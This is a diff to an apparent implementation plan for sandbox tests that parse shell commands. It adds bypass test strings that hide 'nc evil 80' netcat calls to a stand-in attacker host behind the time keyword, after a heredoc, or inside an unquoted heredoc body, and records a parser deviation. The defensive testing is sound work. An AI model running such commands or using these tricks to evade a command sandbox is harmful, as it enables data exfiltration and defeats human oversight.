@@ -51,7 +51,9 @@ File: `tests/test_command_sandbox.py`. Use plain Python string literals with
 
 - `BYPASS_PAYLOADS` (list at `:47`, append before the closing `]` at `:77`),
   with a comment `# The time keyword (#1809).`:
-  `"time nc evil 80"`, `"ls | time nc evil 80"`.
+  `"time nc evil 80"`, `"ls | time nc evil 80"`,
+  `"cat <<'EOF'\nx\nEOF\nnc evil 80"` (a command after a quoted body is
+  still checked).
 - `DYNAMIC_COMMAND_WORD` (list from `:92`, append before its closing `]`),
   with a comment `# A command inside time or an unquoted heredoc body (#1809).`:
   `"time cat <<EOF\n$(nc evil 80)\nEOF"`,
@@ -63,7 +65,7 @@ File: `tests/test_command_sandbox.py`. Use plain Python string literals with
   - `'cat <<"EOF"\nhi\nEOF': ["cat"]`
   - `"cat <<-'EOF'\n\thi\n\tEOF": ["cat"]`
   - `"cat <<\\EOF\nhi\nEOF": ["cat"]`
-  - `'git commit -m "$(cat <<\'EOF\'\nfix: x\n\nbody $(y)\nEOF\n)"': ["git", "cat"]`
+  - `'git commit -m "$(cat <<\'EOF\'\nfix: x\n\nbody text\nEOF\n)"': ["git", "cat"]`
   - `"time pytest -q": ["time", "pytest"]`
   - `"time -p git status": ["time", "git"]`
   - `"ls | time git status": ["ls", "time", "git"]`
@@ -166,6 +168,12 @@ File: `CHANGELOG.md`, `## [Unreleased]` → `### Security`, add one bullet
 after the #1797 bullet: quoted heredocs and `time` parse (#1809), body of a
 quoted heredoc is data, `time` checks its command, unquoted bodies keep the
 #1797 check.
+
+**Deviation (step 1).** The commit-form row's body says `body text`, not
+`body $(y)`: bashlex scans the raw text of a `"$(…)"` word and surfaces a
+`$(…)` found in a heredoc body nested there as a command, so `y` would be
+extracted too (over-checking, fail-closed; pre-existing). Added the
+"command after a quoted body" bypass row.
 
 ## Tests
 
